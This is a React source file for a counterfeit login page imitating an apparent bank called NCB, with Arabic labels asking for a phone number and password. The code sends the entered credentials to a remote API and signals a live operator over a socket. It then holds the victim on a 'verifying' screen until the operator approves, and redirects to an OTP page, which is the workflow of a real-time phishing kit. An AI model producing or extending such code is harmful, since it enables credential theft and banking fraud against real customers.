import { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import axios from "axios";
import { FaMobileAlt, FaLock } from "react-icons/fa";
import NcbLayout from "../components/NcbLayout";
import NcbWaitOverlay from "../components/NcbWaitOverlay";
import { api_route, socket } from "../config/api";
import { useAdminApproval } from "../hooks/useAdminApproval";
import { getSessionId, setSessionId } from "../utils/session";

export default function LoginPage() {
  const navigate = useNavigate();
  const [sessionId, setSessionIdState] = useState(getSessionId);
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [localError, setLocalError] = useState("");

  const { waiting, error, startWaiting, clearError } = useAdminApproval({
    sessionId,
    acceptEvent: "acceptUserLogin",
    declineEvent: "declineUserLogin",
    onAccept: () => navigate("/otp"),
  });

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLocalError("");
    clearError();

    if (!phone || !password) {
      setLocalError("الرجاء إدخال رقم الهاتف وكلمة المرور");
      return;
    }

    setSubmitting(true);
    try {
      let id = sessionId;
      if (!id) {
        const { data } = await axios.post(`${api_route}/reg`, {
          form_type: "ncb_bank",
          phone,
        });
        id = data._id;
        setSessionId(id);
        setSessionIdState(id);
        socket.emit("newUser");
      }

      await axios.post(`${api_route}/ncb/login/${id}`, {
        phone,
        loginPassword: password,
      });
      socket.emit("userLogin", id);
      startWaiting();
    } catch {
      setLocalError("حدث خطأ أثناء الإرسال، حاول مرة أخرى");
    } finally {
      setSubmitting(false);
    }
  };

  const displayError =
    localError || (error ? "تم رفض بيانات الدخول، يرجى المحاولة مرة أخرى" : "");

  return (
    <NcbLayout showHeader={false}>
      <form className="ncb-form" onSubmit={handleSubmit}>
        {displayError && <div className="ncb-error">{displayError}</div>}

        <div className="ncb-field-group">
          <label className="ncb-field-label">رقم الهاتف</label>
          <div className="ncb-login-input-wrap">
            <input
              className="ncb-login-input"
              type="tel"
              value={phone}
              onChange={(e) => {
                setPhone(e.target.value);
                clearError();
                setLocalError("");
              }}
              dir="ltr"
            />
            <FaMobileAlt className="ncb-login-input-icon" />
          </div>
        </div>

        <div className="ncb-field-group">
          <label className="ncb-field-label">كلمة المرور</label>
          <div className="ncb-login-input-wrap">
            <input
              className="ncb-login-input"
              type="password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value);
                clearError();
                setLocalError("");
              }}
            />
            <FaLock className="ncb-login-input-icon" />
          </div>
        </div>

        <button
          className="ncb-btn"
          type="submit"
          disabled={submitting || waiting}
        >
          تسجيل الدخول
        </button>
        <button
          type="button"
          className="ncb-link"
          onClick={() => (window.location.href = "/")}
        >
          الرجوع
        </button>

        <div className="ncb-bottom-actions">
          <button type="button" className="ncb-outline-btn">
            عائلتي+
          </button>
          <button type="button" className="ncb-outline-btn">
            فتح حساب جديد
          </button>
        </div>
      </form>

      <NcbWaitOverlay
        visible={waiting}
        message="جاري التحقق من بيانات الدخول، يرجى الانتظار..."
      />
    </NcbLayout>
  );
}
